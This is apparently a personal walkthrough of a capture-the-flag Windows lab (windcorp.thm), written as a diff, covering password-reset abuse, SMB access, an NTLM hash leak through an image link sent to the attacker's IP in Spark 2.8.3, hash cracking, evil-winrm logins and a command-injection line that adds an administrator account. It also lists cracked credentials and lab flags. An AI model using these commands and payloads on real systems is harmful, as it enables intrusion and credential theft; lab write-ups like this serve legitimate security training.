@@ -1,0 +1,122 @@
+ip : 10.10.174.63 
+* tons of ports are open including 53, 88, 445, 3389 etc
+* windows box
+
+Domain : windcorp.thm
+	 fire.windcorp.thm
+
+* adding domains to the host files 
+* visiting the site gives a reset password option and when clicked opens up a new window 
+* gives an option to reset the password of a user with the help of security questions 
+* checking the site for usernames we get lot of usernames out of which one stands out 
+
+Users
+-----
+administrator@windcorp.thm
+edward@windcorp.thm
+fire@windcorp.thm
+luis@windcorp.thm
+organicfish718@fire.windcorp.thm
+organicwolf509@fire.windcorp.thm
+tinywolf424@fire.windcorp.thm
+angrybird253@fire.windcorp.thm
+buse@fire.windcorp.thm
+Edeltraut@fire.windcorp.thm
+Edward@fire.windcorp.thm
+Emile@fire.windcorp.thm
+tinygoose102@fire.windcorp.thm
+brownostrich284@fire.windcorp.thm
+sadswan869@fire.windcorp.thm
+goldencat416@fire.windcorp.thm
+whiteleopard529@fire.windcorp.thm
+happymeercat399@fire.windcorp.thm
+orangegorilla428@fire.windcorp.thm
+
+* checking the lilly users pic on the site we found a possible username and pet name 
+* trying to reset the password for that user with that info succeeds
+
+creds : lilyle : ChangeMe#1234
+
+* attempting to view the smb shares with the credential we found 
+
+smbmap -u 'lilyle' -p 'ChangeMe#1234'  -H windcorp.thm
+
+smbclient //windcorp.thm/Shared -U lilyle --password ChangeMe#1234  
+
+* we get our first flag and a .deb file 
+
+* installing the debian file 
+
+dpkg -i spark_2_8_3.deb
+
+* we start up the spark client 
+* login with the creds of lilyle 
+* search for a contact BUSE
+* a quick google search on the version of the spark shows that its vulnerable 
+* the spark version 2.8.3 is vulnerable
+* if we send an image file to another user via spark and when everytime the user clicks on the link it gets automatically preloaded
+* the external server receives a requist for the image along with the user ntlm hash
+* we start up responder to capture the hash of the user   
+
+responder -I tun0
+
+* we send an image request as payload to the BUSE user 
+
+<img src="http://10.8.179.136/a.png"> 
+
+* the responder picks up the users hash and we can crack it with hashcat
+
+hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
+
+* we cracked the hash
+
+creds : BUSE : uzunLM+3131
+
+* logging in with the creds using evil-winrm
+
+evil-winrm -i 10.10.174.63 -u buse -p 'uzunLM+3131'
+
+* and we get the flag2.txt
+
+flag2 : THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}
+
+* create a temp folder in C:\\ and upload winpeas to the machine using upload feature of the evil-winrm
+* run winpeas and we can see that the user buse is a member of the group account operator 
+
+whoami /groups 
+
+* the account operator group in windows have limited rights to create a new user or modify existing users 
+* we inspect the C:\\ and found a scripts directory
+* the checkserver.ps1 scripts is being run like a cronjob 
+* checking the content of the script shows that the content of C:\users\brittanycr\hosts.txt is actually sent to Invoke-  		 Expression
+* which means that if we place code in the host.txt it will be then executed by the administrator user
+* looks like the hosts.txt file is not writable to the buse user
+* since the buse user is a member of the account operator group, we can change the password of the brittanycr and try to login with the changed credentials to get our hands on the hosts.txt
+* changing the password of the brittanycr user
+
+net user brittanycr Password123 /domain
+
+* we try to login with evil-winrm using the new credentials but was not successfull
+* use the credentials with smbclient to see the shares and download the hosts.txt file
+
+smbclient //windcorp.thm/Users -U brittanycr --password Password123
+
+* download the hosts.txt file 
+* we modify the hosts.txt to include a code to add a new user ilord and add ilord to administrators group 
+
+;net user ilord Password1234! /add;net localgroup Administrators ilord /add
+
+* put the file back to the smb
+
+put hosts.txt
+
+* wait for a few 
+* we login as the ilord user 
+
+evil-winrm -i 10.10.117.125 -u ilord -p 'Password1234!'
+
+* we cd to Administrator/Desktop and grab the flag3.txt
+
+Flag3 : THM{ba3a2bff2e535b514ad760c283890faae54ac2ef}
+
+
